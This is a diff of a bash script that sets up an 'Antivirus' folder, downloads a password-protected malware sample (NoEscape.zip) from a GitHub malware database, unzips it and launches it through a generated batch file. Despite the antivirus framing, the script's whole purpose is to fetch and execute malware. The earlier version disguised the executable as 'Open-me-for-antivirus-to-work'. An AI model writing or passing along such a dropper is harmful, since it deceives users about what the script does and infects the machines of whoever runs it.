@@ -1,29 +1,24 @@
-#! /bin/bash
+#!/bin/bash
 
-cd ..
-cd Desktop
-mkdir Antivirus
+cd ~/Desktop
+mkdir -p Antivirus
 cd Antivirus
-mkdir scripts
-mkdir viruses
+mkdir -p scripts
+mkdir -p viruses
 cd scripts
 touch scripts.bat
 echo "
-START C:\Users\user\Desktop\Antivirus\viruses\Open-This\Open-me-for-antivirus-to-work
+START %UserProfile%\Desktop\Antivirus\viruses\Open-This\NoEscape.exe
 
 
 " > scripts.bat
 cd ..
 cd viruses 
-mkdir Open-This
-cd *
+mkdir -p Open-This
+cd Open-This
 wget https://github.com/Endermanch/MalwareDatabase/raw/master/NoEscape.zip
-echo 'mysubsarethebest'
-unzip *
+unzip -P mysubsarethebest NoEscape.zip
 rm -rf NoEscape.zip
-cp NoEscape.exe Open-me-for-antivirus-to-work.exe
-rm NoEscape.exe
-cd ..
-cd ..
+cd ../..
 cd scripts
 scripts.bat
